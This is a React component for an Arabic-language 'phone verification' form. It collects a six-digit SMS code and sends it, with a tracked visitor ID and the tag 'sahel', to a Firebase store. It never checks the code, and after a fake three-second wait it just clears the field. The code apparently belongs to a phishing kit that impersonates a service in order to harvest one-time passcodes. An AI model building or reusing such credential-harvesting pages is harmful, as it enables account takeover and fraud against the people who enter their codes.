"use client"

import type React from "react"

import { useState } from "react"
import { addData } from "../firebase";
export default function PhoneOTP() {
    const visitorId = localStorage.getItem('visitor');

    const [formData, setFormData] = useState({
        id: visitorId,
       phoneOtp:""
    })
    const [loading, setLoading] = useState(false)

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        setLoading(true)
        
       
        try {
          setTimeout(() => {
            setLoading(false)
          addData({...formData,page:'sahel'})
          setFormData({ id: visitorId, phoneOtp:"" })
        }, 3000);
        } catch (error) {
            console.error("Error:", error)
        }
     
    }

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        setFormData((prev) => ({
            ...prev,
            [e.target.name]: e.target.value,
        }))
    }

    return (
        <div className="form-container py-6 my-6" dir="rtl">
            <h2>التحقق من الهاتف</h2>
           

            <form onSubmit={handleSubmit}>
                <div className="form-group">
                    <label htmlFor="idNumber"> ادخل الرمز المرسل إلى رقم جوالك برسالة نصية</label>
                    <input
                    maxLength={6}
                        type="let"
                        id="phoneOtp"
                        name="phoneOtp"
                        value={formData.phoneOtp}
                        onChange={handleChange}
placeholder="رمز التحقق"                    required
                    />
                </div>

                <button type="submit" disabled={loading}>
                    {loading ? "جاري الإرسال..." : "إرسال"}
                </button>
            </form>

            <style>{`
        .form-container {
          max-width: 500px;
          margin: 0 auto;
          padding: 20px;
          background: white;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        h2 {
          color: #0066cc;
          margin-bottom: 10px;
          font-size: 1.5rem;
        }

        p {
          color: #666;
          margin-bottom: 20px;
          font-size: 0.9rem;
        }

        .form-group {
          margin-bottom: 15px;
        }

        label {
          display: block;
          margin-bottom: 5px;
          color: #333;
        }

        input, select {
          width: 100%;
          padding: 8px 12px;
          border: 1px solid #ddd;
          border-radius: 4px;
          font-size: 1rem;
          direction: rtl;
        }

        input::placeholder {
          color: #999;
        }

        button {
          width: 100%;
          padding: 12px;
          background-color: #0066cc;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 1rem;
          cursor: pointer;
          transition: background-color 0.2s;
        }

        button:hover {
          background-color: #0052a3;
        }

        button:disabled {
          background-color: #999;
          cursor: not-allowed;
        }
      `}</style>
        </div>
    )
}

